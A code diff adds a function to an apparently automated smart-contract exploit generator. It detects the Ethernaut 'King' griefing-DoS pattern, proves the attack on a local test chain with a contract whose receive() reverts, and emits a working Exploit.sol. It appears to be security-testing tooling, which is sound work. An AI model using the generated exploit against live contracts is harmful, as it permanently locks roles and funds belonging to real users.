@@ -2010,6 +2010,151 @@ def _synth_storage_collision(name, target_src, invariants_src, manifest, scan_st
             "ms":int((time.time()-t0)*1000)}
 
 
+def _synth_king_dos(name, target_src, invariants_src, manifest, scan_step, t0):
+    """Ethernaut King 류 그리핑 DoS: 특권 역할(state address)이 push 송금
+    (payable(role).transfer / role.send) 으로 이전 보유자에게 환불하면서 role=msg.sender
+    로 갱신하는 구조. revert 하는 receive 를 가진 공격 컨트랙트가 역할을 차지하면 이후
+    정상 응찰의 환불 송금이 revert 하여 역할이 영구 락된다. 베이스라인(EOA 응찰)은
+    성공하지만 공격 후 동일 응찰이 revert 하는지로 DoS 를 증명한다(오탐 억제)."""
+    import solcx
+    from web3 import Web3
+    strip = _strip_comments(target_src)
+    bodies = _contract_bodies(strip)
+    if name not in bodies:
+        return None
+    tb = bodies[name]
+    # push 송금 대상이 되는 상태 address 변수(= 이전 보유자)와 그 변수 = msg.sender 갱신
+    role = None
+    for m in re.finditer(r"(?:payable\s*\(\s*(\w+)\s*\)|(\w+))\s*\.\s*(?:transfer|send)\s*\(", tb):
+        cand = m.group(1) or m.group(2)
+        if cand and re.search(r"\b" + re.escape(cand) + r"\s*=\s*msg\.sender", tb) \
+                and _slot_index(tb, cand) is not None \
+                and re.search(r"\baddress\b[^;=]*\b" + re.escape(cand) + r"\b", tb):
+            role = cand; break
+    if not role:
+        return None
+    # 진입점: transfer+갱신이 receive/fallback 안이면 raw send, 아니면 무인자 payable 함수
+    def _block(kind):
+        mm = re.search(kind + r"\s*\([^)]*\)[^{]*\{", tb)
+        return _extract_block(tb, mm.end() - 1) if mm else None
+    entry_sel = None  # None → raw send(receive/fallback), else 4byte selector hex
+    rb = _block("receive"); fb = _block("fallback")
+    pat_here = lambda b: b is not None and (".transfer(" in b or ".send(" in b) and re.search(r"=\s*msg\.sender", b)
+    if pat_here(rb) or pat_here(fb):
+        entry_sel = None
+    else:
+        hit = None
+        for fn in _functions(tb):
+            if fn["payable"] and not fn["args"] and (".transfer(" in fn["body"] or ".send(" in fn["body"]) \
+                    and re.search(r"=\s*msg\.sender", fn["body"]):
+                hit = fn["name"]; break
+        if not hit:
+            return None
+        entry_sel = Web3.keccak(text=f"{hit}()")[:4]
+    # 응찰 임계(require(msg.value >= X))의 X 가 public getter 면 배포 후 읽는다
+    gm = re.search(r"require\s*\(\s*msg\.value\s*(>=|>)\s*(\w+)", tb)
+    thr_var, thr_strict = (gm.group(2), gm.group(1) == ">") if gm else (None, False)
+    _solcv, _evm = _solc_for(target_src)
+    pwn_src = (HEADER + "contract Pwn {\n"
+               "    function run(address t, bytes memory data) external payable {\n"
+               "        (bool ok,) = t.call{value: msg.value}(data); require(ok, \"take failed\");\n"
+               "    }\n    receive() external payable { revert(\"grief: refuse refund\"); }\n}\n")
+    std = {"language":"Solidity","sources":{f"{name}.sol":{"content":target_src},"Pwn.sol":{"content":pwn_src}},
+           "settings":{"evmVersion":_evm,"outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
+    try:
+        compiled = solcx.compile_standard(std, allow_empty=True)
+    except Exception:
+        return None
+    arts = {}
+    for _fl, cs in compiled.get("contracts", {}).items():
+        for cn, c in cs.items():
+            arts[cn] = {"abi": c["abi"], "bin": c["evm"]["bytecode"]["object"]}
+    if name not in arts or "Pwn" not in arts:
+        return None
+    abi = arts[name]["abi"]
+    seed = 10**18 if _ctor_payable(abi) else 0
+    w3, acct = _mk_evm()
+    accts = list(w3.eth.accounts)
+    if len(accts) < 4:
+        return None
+    deployer, bidder2, bidder3 = accts[1], accts[2], accts[3]
+    def dep(cn, args, frm, value=0):
+        C = w3.eth.contract(abi=arts[cn]["abi"], bytecode=arts[cn]["bin"])
+        r = w3.eth.wait_for_transaction_receipt(
+            C.constructor(*args).transact({"from":frm,"gas":12_000_000,"value":value}))
+        return r.contractAddress
+    def deploy_target():
+        ctypes = _abi_ctor_types(abi)
+        cargs = [_default_for_type(t) for t in ctypes]
+        try:
+            return dep(name, cargs, deployer, value=seed)
+        except Exception:
+            return dep(name, cargs, deployer, value=0)
+    def _ok(txh):  # eth-tester 는 revert 시 예외 대신 status=0 영수증을 준다
+        try:
+            return int(w3.eth.wait_for_transaction_receipt(txh).status) == 1
+        except Exception:
+            return False
+    def take(frm, taddr, value):  # 역할 차지 시도 → 성공(True)/revert(False)
+        tx = {"from":frm,"to":taddr,"value":value,"gas":1_000_000}
+        if entry_sel is not None: tx["data"] = entry_sel
+        try:
+            return _ok(w3.eth.send_transaction(tx))
+        except Exception:
+            return False
+    # 임계값 계산
+    taddr = deploy_target()
+    tc = w3.eth.contract(address=taddr, abi=abi)
+    thr = seed
+    if thr_var:
+        try: thr = int(tc.functions[thr_var]().call())
+        except Exception: thr = seed
+    bid = thr + (1 if thr_strict else 0)
+    if bid <= 0: bid = 1
+    def _next_bid():
+        if not thr_var: return bid
+        try: return int(tc.functions[thr_var]().call()) + (1 if thr_strict else 0)
+        except Exception: return bid
+    tester = w3.provider.ethereum_tester; snap = tester.take_snapshot()
+    # 1) 베이스라인: EOA 두 명이 순차 응찰 → 둘 다 성공해야 함(정상 흐름)
+    baseline_ok = take(bidder2, taddr, bid) and take(bidder3, taddr, max(_next_bid(), bid))
+    tester.revert_to_snapshot(snap)
+    if not baseline_ok:
+        return None
+    # 2) 공격: revert-receive 컨트랙트가 역할 차지 → 이후 정상 응찰이 revert 해야 함
+    try:
+        paddr = dep("Pwn", [], acct)
+    except Exception:
+        return None
+    data = (b"" if entry_sel is None else entry_sel)
+    pwn = w3.eth.contract(address=paddr, abi=arts["Pwn"]["abi"])
+    try:
+        if not _ok(pwn.functions.run(taddr, data).transact({"from":acct,"value":bid,"gas":3_000_000})):
+            return None  # 공격자가 역할조차 못 잡으면 성립 아님
+    except Exception:
+        return None
+    # 정상 응찰이 이제 revert(=status 0) 하면 역할 영구 락(그리핑 DoS)
+    attack_blocked = not take(bidder3, taddr, max(_next_bid(), bid))
+    if not attack_blocked:
+        return None
+    sel_note = "receive()" if entry_sel is None else f"0x{entry_sel.hex()}"
+    poc = (HEADER +
+        "// Strategy: griefing DoS (Ethernaut King). The role is refunded via a push\n"
+        f"// transfer to `{role}` and then set to msg.sender. An attacker whose receive()\n"
+        "// reverts seizes the role; every later bid's refund transfer then reverts,\n"
+        f"// permanently locking the role. Entry: {sel_note}.\n"
+        "contract Exploit {\n"
+        "    function run(address payable t) external payable {\n"
+        + ("        (bool ok,) = t.call{value: msg.value}(\"\"); require(ok);\n" if entry_sel is None
+           else f"        (bool ok,) = t.call{{value: msg.value}}(hex\"{entry_sel.hex()}\"); require(ok);\n") +
+        "    }\n    receive() external payable { revert(\"refuse refund\"); }\n}\n")
+    gen = {"step":"generate","title":"Exploit.sol 생성 (griefing-dos)","strategy":"king-dos","exploit_src":poc}
+    return {"name":name,"proven":True,"firstViolated":f"role '{role}' locked via griefing DoS",
+            "strategy":f"king-dos:{role}","steps":[scan_step,gen],"exploit_src":poc,"mode":"effect",
+            "note":"revert 하는 receive 로 특권 역할을 차지해 이후 환불 송금을 막고 역할을 영구 락했습니다(그리핑 DoS).",
+            "ms":int((time.time()-t0)*1000)}
+
+
 def _multiblock_attempt(name, target_src, invariants_src, manifest, scan_step, t0):
     """다중 블록 러너: 블록 엔트로피로 결과가 정해지는 게임(예: CoinFlip)에서,
     소스의 결과식을 복제한 공격 컨트랙트를 배포하고 블록을 넘기며 매 블록 올바른
@@ -2358,6 +2503,13 @@ def _fuzz_fallback(name, target_src, invariants_src, manifest, do_verify, scan_s
     # 0g) delegatecall 스토리지 충돌 2단계 (예: Preservation)
     try:
         r = _synth_storage_collision(name, target_src, invariants_src, manifest, scan_step, t0)
+        if r:
+            return r
+    except Exception:
+        pass
+    # 0h) 그리핑 DoS (예: King — revert-receive 로 특권 역할 영구 락)
+    try:
+        r = _synth_king_dos(name, target_src, invariants_src, manifest, scan_step, t0)
         if r:
             return r
     except Exception:
